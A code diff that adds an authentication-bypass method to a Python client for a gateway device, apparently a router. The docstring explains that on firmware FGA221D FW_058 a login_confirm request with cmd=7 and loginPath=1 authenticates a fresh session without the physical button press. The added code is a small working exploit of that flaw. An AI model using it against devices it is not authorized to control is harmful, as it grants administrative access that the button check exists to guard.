@@ -276,6 +276,23 @@ class GatewayClient:
                 log("[login] button press detected")
         return False
 
+    def try_no_press_login(self) -> bool:
+        """Attempt the server-side auth bypass (verified FGA221D FW_058).
+
+        Triple-confirmed 2026-10-04 (Mac + MT3000 sources): the login
+        confirm performs NO server-side verification — a fresh session that
+        sends ``login_confirm cmd=7 loginPath=1`` is authenticated without
+        any button press and without arming.  The button requirement exists
+        only in the web UI's client-side flow.  Returns True when the
+        session became authenticated via this path.
+        """
+        auth_service = self.device.cap("auth", "service",
+                                       default="login_confirm")
+        self.fresh_session()
+        self.set(auth_service, cmd=7, loginPath=1)
+        time.sleep(0.3)
+        return self.is_authenticated()
+
     def button_login_passive(self, wait_seconds: int = 300, log=print) -> bool:
         """Passive button-window listener — NO arming step.
 
